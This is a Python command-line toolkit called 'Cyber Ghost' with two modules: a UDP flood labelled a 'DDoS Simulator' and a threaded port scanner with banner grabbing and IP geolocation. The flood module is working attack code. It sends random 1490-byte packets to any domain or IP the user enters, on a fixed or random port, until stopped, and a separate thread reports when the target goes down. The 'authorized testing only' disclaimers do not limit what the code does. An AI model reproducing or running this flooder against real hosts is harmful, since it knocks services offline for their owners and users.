#!/usr/bin/env python3
import os
import sys
import time
import random
import socket
import threading
import requests
from datetime import datetime
from tqdm import tqdm  # pip install tqdm

# ======================== GLOBAL CONFIG & COLORS ========================
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
PURPLE = "\033[95m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"

IS_WINDOWS = os.name == 'nt'
CLEAR_CMD = "cls" if IS_WINDOWS else "clear"

def clear_screen():
    os.system(CLEAR_CMD)

# ======================== CYBER GHOST BANNER ========================
def cyber_ghost_banner():
    clear_screen()
    banner = f"""
{RED}{BOLD}
   ██████╗██╗   ██╗██████╗ ███████╗██████╗     ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗   ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝   ██║  ██╗ ███████║██║   ██║███████╗   ██║   
  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗   ██║  ╚██╗██╔══██║██║   ██║╚════██║   ██║   
  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║   ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   
   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   
{RESET}
{CYAN}{BOLD}                    CYBER GHOST - ADVANCED ETHICAL HACKING TOOLKIT{RESET}
{YELLOW}                 DDoS Simulator | Port Scanner | Reconnaissance{RESET}
{PURPLE}                        Version 2.0 - For Authorized Testing Only{RESET}
"""
    print(banner)

# ======================== DDOS ATTACK (FORMER BLOODSHOT GUARDIANS) ========================
VERSION = "2.0"

def ddos_banner():
    clear_screen()
    print(f"{RED}╔════════════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{RED}║                 {PURPLE}{BOLD}CYBER GHOST DDoS SIMULATOR{RESET}                           ║{RESET}")
    print(f"{RED}║            Blood-Eyed Protectors – Tremor for Ha*kers                     ║{RESET}")
    print(f"{RED}║                         Version: {VERSION}                                        ║{RESET}")
    print(f"{RED}╚════════════════════════════════════════════════════════════════════════════╝{RESET}\n")

def show_statistics(target_ip, port_mode, port, packets_sent, start_time, last_ping_time, down_time):
    elapsed = time.time() - start_time
    speed = packets_sent / elapsed if elapsed > 0 else 0
    
    intensity = "Shadow Level" if packets_sent < 10000 else "Medium Storm" if packets_sent < 100000 else "Apocalypse Mode"
    est_down_sec = "Calculating..." if speed == 0 else f"~{max(0, int((1000000 - packets_sent) / speed))} sec"
    botnet_size = "Small Botnet" if packets_sent < 50000 else "Medium Botnet" if packets_sent < 500000 else "Massive Botnet"
    simulated_load = min(100, speed * 0.01)
    power_level = min(10, int(speed / 100) + 1)
    power_bar = "■" * power_level + "□" * (10 - power_level)
    bandwidth_gb = (packets_sent * 1490) / (1024 ** 3)
    ping_display = f"{last_ping_time:.2f}ms" if last_ping_time > 0 else "N/A"
    panic_mode = "PANIC MODE ACTIVATED!" if packets_sent > 5000 else ""
    status = f"{GREEN}ACTIVE{RESET}" if down_time is None else f"{RED}ABSOLUTELY DOWN after {int(down_time - start_time)} sec{RESET}"
    
    print(f"\n{YELLOW}{BOLD}╔════════════════════════════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{YELLOW}║{RESET}  Target IP                  : {CYAN}{target_ip:<70}{RESET}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Port Mode                  : {'Specific' if port_mode else 'Random Ports'} ({port if port_mode else 'Auto'}){RESET:<70}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Packets Sent               : {GREEN}{packets_sent:,}{RESET:<70}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Packets/Sec                : {GREEN}{speed:.2f}{RESET:<70}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Running Time               : {GREEN}{int(elapsed // 60)}m {int(elapsed % 60)}s{RESET:<70}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Intensity Level            : {RED}{intensity:<70}{RESET}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Est. Down Time             : {YELLOW}{est_down_sec:<70}{RESET}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Botnet Size                : {PURPLE}{botnet_size:<70}{RESET}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Simulated Load             : {GREEN}{simulated_load:.1f}%{RESET:<70}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Attack Power               : Level {power_level}/10 {RED}{power_bar}{RESET:<70}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Bandwidth Sent             : {CYAN}{bandwidth_gb:.2f} GB{RESET:<70}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Last Ping Time             : {YELLOW}{ping_display:<70}{RESET}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Target Panic               : {RED}{panic_mode:<70}{RESET}{YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  Status                     : {status:<70}{YELLOW}║{RESET}")
    print(f"{YELLOW}╚════════════════════════════════════════════════════════════════════════════════════════════╝{RESET}\n")

def check_down(target_ip, start_time, attack_running, down_time, last_ping_time):
    dt = down_time
    lpt = last_ping_time
    while attack_running[0]:
        try:
            ping_start = time.time()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target_ip, 80))
            s.close()
            lpt[0] = (time.time() - ping_start) * 1000
        except:
            if dt[0] is None:
                dt[0] = time.time()
                print(f"\n{RED}{BOLD}TARGET ABSOLUTELY DOWN DETECTED!{RESET}")
                print(f"{YELLOW}Absolutely Down after approximately {int(time.time() - start_time)} seconds{RESET}\n")
            break
        time.sleep(10)

def ddos_attack():
    ddos_banner()
    print(f"{GREEN}Author: {RED}{BOLD}Cyber Ghost Team{RESET}")
    print("Purpose: Legal & Ethical Penetration Testing Only\n")

    ip = None
    while True:
        print(f"{GREEN}{BOLD}[1]{RESET} Target Website Domain")
        print(f"{GREEN}{BOLD}[2]{RESET} Target IP Address")
        print(f"{GREEN}{BOLD}[3]{RESET} Back to Main Menu")
        choice = input(f"{WHITE}Select option > {RESET}")

        if choice == '1':
            domain = input(f"{CYAN}Enter Domain: {RESET}")
            try:
                ip = socket.gethostbyname(domain)
                print(f"{GREEN}Resolved IP: {ip}{RESET}")
                break
            except:
                print(f"{RED}Error: Invalid domain!{RESET}")
                time.sleep(2)

        elif choice == '2':
            ip = input(f"{CYAN}Enter IP Address: {RESET}")
            break

        elif choice == '3':
            return  # back to main menu

        else:
            print(f"{RED}Invalid choice!{RESET}")
            time.sleep(1.5)

    # Port configuration
    use_specific_port = False
    target_port = 80

    while True:
        choice = input(f"{WHITE}Use specific port? [y/n]: {RESET}").lower()
        if choice == 'y':
            use_specific_port = True
            try:
                target_port = int(input(f"{CYAN}Enter Open port : {RESET}"))
                break
            except:
                print(f"{RED}Invalid! Default 80.{RESET}")
                break
        elif choice == 'n':
            break
        else:
            print(f"{RED}y or n only.{RESET}")

    # Attack start
    clear_screen()
    print(f"{CYAN}Cyber Ghost DDoS Engine INITIALIZING...{RESET}")
    time.sleep(1.5)
    print(f"{RED}{BOLD}GHOST MODE ACTIVATED{RESET}")
    time.sleep(2.5)
    print(f"{YELLOW}Target locked: {ip}{RESET}\n")

    packets_sent = 0
    start_time = time.time()
    attack_running_flag = [True]  # mutable for thread
    down_time = [None]
    last_ping_time = [0.0]

    # Create socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_data = random._urandom(1490)
    except Exception as e:
        print(f"{RED}Socket creation failed: {e}{RESET}")
        return

    # Progress bar
    pbar = tqdm(total=1000000, desc="Attack Progress", unit="pkt", leave=True)

    # Start down check thread
    down_thread = threading.Thread(target=check_down, args=(ip, start_time, attack_running_flag, down_time, last_ping_time))
    down_thread.daemon = True
    down_thread.start()

    try:
        while attack_running_flag[0]:
            if use_specific_port:
                sock.sendto(bytes_data, (ip, target_port))
            else:
                current_port = random.randint(1, 65535)
                if current_port == 1900:
                    current_port = 1901
                sock.sendto(bytes_data, (ip, current_port))

            packets_sent += 1
            pbar.update(1)

            if packets_sent % 50 == 0:
                clear_screen()
                ddos_banner()
                show_statistics(ip, use_specific_port, target_port if use_specific_port else 'Random', packets_sent, start_time, last_ping_time[0], down_time[0])

    except KeyboardInterrupt:
        attack_running_flag[0] = False
        sock.close()
        pbar.close()
        clear_screen()
        ddos_banner()
        show_statistics(ip, use_specific_port, target_port if use_specific_port else 'Random', packets_sent, start_time, last_ping_time[0], down_time[0])
        print(f"\n{GREEN}{BOLD}CTRL+C detected! Mission safely stopped.{RESET}")
        print(f"{YELLOW}Cyber Ghost DDoS exited cleanly.{RESET}\n")
        input("Press Enter to return to main menu...")

    except Exception as e:
        attack_running_flag[0] = False
        sock.close()
        pbar.close()
        clear_screen()
        print(f"\n{RED}Error: {e}{RESET}")
        print(f"{YELLOW}Cyber Ghost DDoS exited safely.{RESET}")
        input("Press Enter to return to main menu...")

# ======================== PORT SCANNER (FORMER PHANTOMRECON) ========================
def scanner_banner():
    clear_screen()
    print(f"{GREEN}{BOLD}")
    print("   ██████╗██╗   ██╗██████╗ ███████╗██████╗     ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗")
    print("  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗   ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝")
    print("  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝   ██║  ███╗███████║██║   ██║███████╗   ██║   ")
    print("  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗   ██║   ██║██╔══██║██║   ██║╚════██║   ██║   ")
    print("  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║   ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ")
    print("   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ")
    print(f"{RESET}")
    print(f"{CYAN}{BOLD}                 PORT SCANNER & RECONNAISSANCE MODULE{RESET}")
    print(f"{YELLOW}                      Stealth Mode - Top 200 Ports{RESET}\n")
    
def print_professional_result(title, content_lines):
    clear_screen()
    scanner_banner()
    print("\033[94m" + "═"*60 + "\033[0m")
    print(f"\033[96m  {title.center(58)}  \033[0m")
    print("\033[94m" + "═"*60 + "\033[0m\n")
    
    for line in content_lines:
        print(f"  \033[97m{line}\033[0m")
    
    print("\n\033[94m" + "═"*60 + "\033[0m")
    print("\033[92m  Press Enter to return to menu...\033[0m")
    input()

def clean_domain(target):
    target = target.strip()
    if target.startswith(("http://", "https://")):
        target = target.split("//")[1]
    if target.startswith("www."):
        target = target[4:]
    return target

def get_ip(domain):
    try:
        ip = socket.gethostbyname(domain)
        return ip
    except:
        return None

def get_ip_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = response.json()
        if data.get("status") == "success":
            return [
                f"Country     : {data.get('country')} ({data.get('countryCode')})",
                f"City        : {data.get('city') or 'N/A'}",
                f"ISP         : {data.get('isp')}",
                f"Organization: {data.get('org') or 'N/A'}"
            ]
        else:
            return ["IP info not available"]
    except:
        return ["Failed to fetch IP information"]

def grab_banner(ip, port):
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect((ip, port))
        banner = s.recv(1024).decode(errors='ignore').strip()
        s.close()
        return banner[:80] if banner else "No banner"
    except:
        return "No banner"

def scan_port(ip, port, results):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.0)  
        result = sock.connect_ex((ip, port))
        if result == 0:
            banner = grab_banner(ip, port)
            service = socket.getservbyport(port, 'tcp') if port < 1025 else "unknown"
            results.append(f"Port: {port:<5} | Service: {service:<12} | Banner: {banner}")
        sock.close()
    except:
        pass

def port_scanner():
    scanner_banner()
    target = input("\n\033[96mEnter Website URL or Domain: \033[97m").strip()
    domain = clean_domain(target)

    ip = get_ip(domain)
    if not ip:
        print_professional_result("ERROR", ["Failed to resolve domain.", "Please check the URL and try again."])
        return

    ip_info_lines = get_ip_info(ip)

    print(f"\n\033[95mStarting fast stealth scan on {ip} (Top 200 Ports)...\033[0m\n")

    top_ports = list(range(1, 201)) + [443, 8080, 8443, 3306, 3389, 21, 22, 23, 25, 53, 110, 143, 465, 587, 993, 995]
    top_ports = list(set(top_ports))
    random.shuffle(top_ports)

    results = []
    threads = []
    max_threads = 40  
    
    for port in top_ports:
        t = threading.Thread(target=scan_port, args=(ip, port, results))
        threads.append(t)
        t.start()

        if len(threads) >= max_threads:
            for t in threads:
                t.join()
            threads = []

        time.sleep(random.uniform(0.05, 0.25))

    for t in threads:
        t.join()

    output_lines = [
        f"Target Domain : {domain}",
        f"Resolved IP   : {ip}",
        "",
        "IP Information:"
    ] + ["  " + line for line in ip_info_lines] + [
        "",
        f"Scan Time     : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"Open Ports    : {len(results)} found",
        ""
    ]

    if results:
        output_lines.append("Open Ports Details:")
        output_lines.extend(["  " + line for line in results])
    else:
        output_lines.append("No open ports detected in top 200 range.")

    print_professional_result("SCAN COMPLETE", output_lines)

    # Save to file
    with open("cyberghost_scan_results.txt", "a") as f:
        f.write(f"\n\n=== Scan Report - {datetime.now()} ===\n")
        f.write(f"Domain: {domain} | IP: {ip}\n")
        f.write("\n".join(output_lines) + "\n")

# ======================== HOW TO USE ========================
def how_to_use():
    clear_screen()
    cyber_ghost_banner()
    print(f"{CYAN}{BOLD}════════════════════════════════════════════════════════════{RESET}")
    print(f"{GREEN}{BOLD}                    HOW TO USE CYBER GHOST{RESET}")
    print(f"{CYAN}{BOLD}════════════════════════════════════════════════════════════{RESET}\n")
    
    print(f"{YELLOW}1. DDoS Attack (Cyber Ghost DDoS Simulator):{RESET}")
    print("   - Simulates a UDP flood attack for educational purposes.")
    print("   - Enter a domain or IP address of the target (authorized only).")
    print("   - Choose specific port or random ports.")
    print("   - Attack continues until Ctrl+C is pressed.")
    print("   - Real-time statistics: packets sent, speed, estimated downtime.\n")
    
    print(f"{YELLOW}2. Port Scanner (Cyber Ghost Port Scanner):{RESET}")
    print("   - Scans top 200 ports on the target domain/IP.")
    print("   - Retrieves IP geolocation, ISP, and service banners.")
    print("   - Results saved to 'cyberghost_scan_results.txt'.\n")
    
    print(f"{YELLOW}3. How to Use:{RESET}  Displays this help.\n")
    print(f"{YELLOW}4. Exit:{RESET}  Quit the program.\n")
    
    print(f"{RED}{BOLD}IMPORTANT:{RESET} Only use on systems you own or have explicit permission to test.")
    print("The Cyber Ghost team is not responsible for misuse.\n")
    
    input(f"{GREEN}Press Enter to return to main menu...{RESET}")

# ======================== MAIN MENU ========================
def main_menu():
    while True:
        cyber_ghost_banner()
        print(f"{GREEN}{BOLD}[1]{RESET} DDoS Attack")
        print(f"{GREEN}{BOLD}[2]{RESET} Port Scanner")
        print(f"{GREEN}{BOLD}[3]{RESET} How to Use")
        print(f"{GREEN}{BOLD}[4]{RESET} Exit\n")
        choice = input(f"{WHITE}Select option > {RESET}")

        if choice == '1':
            ddos_attack()
        elif choice == '2':
            port_scanner()
        elif choice == '3':
            how_to_use()
        elif choice == '4':
            print(f"{RED}Exiting Cyber Ghost...{RESET}")
            sys.exit(0)
        else:
            print(f"{RED}Invalid choice!{RESET}")
            time.sleep(1.5)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{RED}Exiting...{RESET}")
        sys.exit(0)